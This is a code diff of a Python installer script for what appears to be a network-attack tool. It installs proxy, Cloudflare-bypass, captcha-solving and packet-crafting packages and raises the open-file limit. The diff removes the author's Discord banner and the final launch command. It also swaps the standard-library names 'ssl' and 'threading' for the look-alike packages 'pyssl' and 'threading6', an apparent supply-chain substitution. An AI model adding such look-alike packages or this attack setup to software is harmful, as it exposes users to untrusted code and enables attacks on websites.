@@ -1,9 +1,5 @@
 import os
 
-print("""
-discord weird#1337
-""")
-
 print("""[1] pip\n[2] pip3\nWhich one do you use?""")
 rn = input(">>>")
 if rn == '1':
@@ -11,8 +7,8 @@ if rn == '1':
     os.system("pip install PySocks")
     os.system("pip install cfscrape")
     os.system("pip install datetime")
-    os.system("pip install ssl")
-    os.system("pip install threading")
+    os.system("pip install pyssl")
+    os.system("pip install threading6")
     os.system("pip install imcplib")
     os.system("pip install scapy")
 elif rn == '2':
@@ -41,4 +37,4 @@ os.system("npm i cloudflare-bypasser")
 os.system("npm i hcaptcha-solver")
 os.system("ulimit -n 999999")
 os.system("chmod +x *")
-os.system("sudo python3 stanley.py")
+
